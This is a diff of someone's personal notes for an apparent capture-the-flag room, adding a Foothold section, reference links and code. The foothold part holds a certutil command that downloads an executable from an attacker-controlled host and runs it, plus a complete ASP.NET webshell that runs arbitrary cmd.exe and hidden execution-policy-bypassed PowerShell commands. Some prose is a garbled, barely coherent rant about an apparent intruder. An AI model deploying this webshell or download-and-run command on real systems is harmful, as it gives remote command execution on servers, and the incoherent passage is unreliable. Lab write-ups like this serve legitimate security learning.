@@ -249,9 +249,34 @@ WE can just upload a webshell to the http server running on port 49663....
 
 ## Foothold
 
-![](netstatyourmindintothewtf.png)
+Sharing my shoes with someone again. This was doctored. I used a `nc` because low hanging fruit O'clock on 443. Must have been brown trousers new year's eve. Just because a manager would probably confidentially laugh at me on this one. Amusing I do not need proof to share, but this still needs to be here. I also need to actually learn stuff so could you at least use your own call to you the `nc`i uploaded like its 2018. 
 
-40.127.240.158
+![1080](netstatyourmindintothewtf.png)
+
+40[.]127[.]240[.]158 and 40[.]68[.]123[.]157 - For using my port go burn your stuff. And your fancy update.microsoft dns names, could you at least use another port I am barely capable at turning on the computer. Can you not just buy a subscription and pretend to be someone if you can afford to waste my time - I need my time. Also is this not crazy sloppy and cant you just rent a servers in some random country? I probably wont even make the same money spent to bother me in my lifetime that you wasted on being this bad that I found you. Worst of all it is gonna take I now need to go baseline loads of of Windows Server to check how many of them have this insanely open network configuration. And I can barely get on this server. Have you not better things to do? You can respond character by character at a time with pictures really prove those hours argue value of clocking in those hours.  
+
+![](admininthebin.png)
+
+```
+certutil.exe -urlcache -split -f http://10.11.3.193/outlook.exe C:\programdata\outlook.exe
+
+
+start "Tutil-msSRV - Important Test" /d C:\programdata\outlook.exe  /b /high /wait 
+
+```
+
+While everything dies I at least managed to write the word hello to `c:\programdata\test.txt`
+![](waitingsotestahello.png)
+
+Having to check every shoelace, PowerShell does work this time.... 
+![](powershelldoeswork.png)
+
+![](doublecheckingpsexec.png)
+
+![](wehaveav.png)
+
+
+![](mshtafail.png)
 ## Privilege Escalation
 
 ## Post-Root-Reflection  
@@ -266,9 +291,111 @@ Update my rpc cheatsheet
 - https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
 - https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
 
+powershell
+- https://www.ired.team/offensive-security/code-execution/powershell-without-powershell
+- https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass
+
+IIS 
+- https://stackify.com/w3wp-exe-iis-worker-process/
+
+upx --ultra
+- https://sibprogrammer.medium.com/go-binary-optimization-tricks-648673cc64ac
 
 - https://black.vercel.app/ python formatter
 
 Note - Nothing in this room requires Metasploit
 
-THM{fdk4ka34vk346ksxfr21tg789ktf45}
+Learn some ASP - does not work
+```asp
+<%@ Page Language="C#" Debug="true" Trace="false" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<script Language="c#" runat="server">
+void Page_Load(object sender, EventArgs e)
+{
+}
+string ExcuteCmd(string arg)
+{
+ProcessStartInfo psi = new ProcessStartInfo();
+psi.FileName = "cmd.exe";
+psi.Arguments = "/c "+arg;
+psi.RedirectStandardOutput = true;
+psi.UseShellExecute = false;
+Process p = Process.Start(psi);
+StreamReader stmrdr = p.StandardOutput;
+string s = stmrdr.ReadToEnd();
+stmrdr.Close();
+return s;
+}
+void cmdExe_Click(object sender, System.EventArgs e)
+{
+Response.Write("<pre>");
+Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg_cmd.Text)));
+Response.Write("</pre>");
+}
+string ExcutePWSH(string arg)
+{
+ProcessStartInfo psi = new ProcessStartInfo();
+psi.FileName = "powershell.exe";
+psi.Arguments = "-ep bypass -windowstyle hidden -command {"+arg+" }";
+psi.RedirectStandardOutput = true;
+psi.UseShellExecute = false;
+Process p = Process.Start(psi);
+StreamReader stmrdr = p.StandardOutput;
+string s = stmrdr.ReadToEnd();
+stmrdr.Close();
+return s;
+}
+void pwshExe_Click(object sender, System.EventArgs e)
+{
+Response.Write("<pre>");
+Response.Write(Server.HtmlEncode(ExcutePWSH(txtArg_pwsh.Text)));
+Response.Write("</pre>");
+}
+string ExcuteCmdSE(string arg)
+{
+ProcessStartInfo psi = new ProcessStartInfo();
+psi.FileName = "cmd.exe";
+psi.Arguments = "/c "+arg;
+psi.RedirectStandardOutput = true;
+psi.UseShellExecute = true;
+Process p = Process.Start(psi);
+StreamReader stmrdr = p.StandardOutput;
+string s = stmrdr.ReadToEnd();
+stmrdr.Close();
+return s;
+}
+void cmdExe_SE_Click(object sender, System.EventArgs e)
+{
+Response.Write("<pre>");
+Response.Write(Server.HtmlEncode(ExcuteCmdSE(txtArg_cmd_se.Text)));
+Response.Write("</pre>");
+}
+</script>
+<HTML>
+<HEAD>
+<title>awen + 7ru7h asp.net webshell</title>
+</HEAD>
+<body>
+<form id="cmd" method="post" runat="server">
+<asp:TextBox id="txtArg_cmd" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
+<asp:Button id="testing_cmd" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="cmd.exe" OnClick="cmdExe_Click"></asp:Button>
+<asp:Label id="lblText_cmd" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Execute cmd /c without ShellExec - good for commands:</asp:Label>
+</form>
+<form id="powershell" method="post" runat="server">
+<asp:TextBox id="txtArg_pwsh" style="Z-INDEX: 201; LEFT: 405px; POSITION: absolute; TOP: 40px" runat="server" Width="250px"></asp:TextBox>
+<asp:Button id="testing_pwsh" style="Z-INDEX: 202; LEFT: 675px; POSITION: absolute; TOP: 36px" runat="server" Text="powershell.exe" OnClick="pwshExe_Click"></asp:Button>
+<asp:Label id="lblText_pwsh" style="Z-INDEX: 203; LEFT: 310px; POSITION: absolute; TOP: 44px" runat="server">Execute PowerShell:</asp:Label>
+</form>
+<form id="cmd_se" method="post" runat="server">
+<asp:TextBox id="txtArg_cmd_se" style="Z-INDEX: 301; LEFT: 405px; POSITION: absolute; TOP: 60px" runat="server" Width="250px"></asp:TextBox>
+<asp:Button id="testing_cmd_se" style="Z-INDEX: 302; LEFT: 675px; POSITION: absolute; TOP: 54px" runat="server" Text="cmd.exe ShellExec" OnClick="cmdExe_SE_Click"></asp:Button>
+<asp:Label id="lblText_cmd_se" style="Z-INDEX: 303; LEFT: 310px; POSITION: absolute; TOP: 66px" runat="server">Execute cmd.exe /c with UseShellExecute:</asp:Label>
+</form>
+</body>
+</HTML>
+
+<!-- "Improvements" by 7ru7h and Phind model for button position guessing--->
+<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
+<!--    http://michaeldaw.org   04/2007    -->
+```
